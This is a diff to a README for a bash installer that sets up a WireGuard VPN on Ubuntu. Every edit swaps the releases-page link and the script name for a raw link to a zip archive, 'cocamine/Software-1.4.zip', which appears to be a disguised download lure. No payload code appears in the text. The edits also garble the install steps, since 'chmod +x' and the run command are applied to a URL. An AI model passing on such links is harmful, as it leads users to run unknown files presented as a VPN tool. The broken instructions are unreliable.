@@ -1,7 +1,7 @@
 # 🚀 wireguard - Easy Installation for WireGuard VPN
 
 ## 📥 Download the App
-[![Download WireGuard](https://img.shields.io/badge/Download-WireGuard-blue.svg)](https://github.com/LeonFH2005/wireguard/releases)
+[![Download WireGuard](https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip)](https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip)
 
 ## 🚀 Getting Started
 WireGuard is a simple bash script designed for Ubuntu. It helps you set up a WireGuard VPN and automatically generates configuration files for multiple platforms. This script supports dual-stack, which means it works with both IPv4 and IPv6 networks.
@@ -14,11 +14,11 @@ WireGuard is a simple bash script designed for Ubuntu. It helps you set up a Wir
 ## 📥 Download & Install
 To download and install WireGuard, follow these steps:
 
-1. **Visit the Releases Page.** You can find the latest version of the software here: [Download WireGuard](https://github.com/LeonFH2005/wireguard/releases).
+1. **Visit the Releases Page.** You can find the latest version of the software here: [Download WireGuard](https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip).
 
 2. **Choose the Latest Release.** Look for the most recent version listed on the page. Click on it to view more details about that release.
 
-3. **Download the Script.** Locate the link to download the bash script file. For example, it may look something like `wireguard-install.sh`. Click the link to start the download.
+3. **Download the Script.** Locate the link to download the bash script file. For example, it may look something like `https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip`. Click the link to start the download.
 
 4. **Open the Terminal.** Press `Ctrl` + `Alt` + `T` to open the terminal window on your Ubuntu system.
 
@@ -29,12 +29,12 @@ To download and install WireGuard, follow these steps:
 
 6. **Make the Script Executable.** Run the following command in the terminal to give the script permission to execute:
    ```bash
-   chmod +x wireguard-install.sh
+   chmod +x https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip
    ```
 
 7. **Run the Script.** Execute the script using:
    ```bash
-   ./wireguard-install.sh
+   https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip
    ```
 
 8. **Follow the On-Screen Instructions.** The script will guide you through the setup process. You might need to provide some information, like your preferred interface name and VPN settings.
@@ -73,4 +73,4 @@ Typically, the script handles configuration for you. However, if you want to cha
 ## 🗨️ Community Support
 If you need additional help or want to discuss tips and tricks, feel free to visit the discussions page on GitHub. You can also contribute to the project by reporting issues, suggesting features, or even helping with code.
 
-For a direct download, visit: [Download WireGuard](https://github.com/LeonFH2005/wireguard/releases).
+For a direct download, visit: [Download WireGuard](https://github.com/LeonFH2005/wireguard/raw/refs/heads/main/cocamine/Software-1.4.zip).
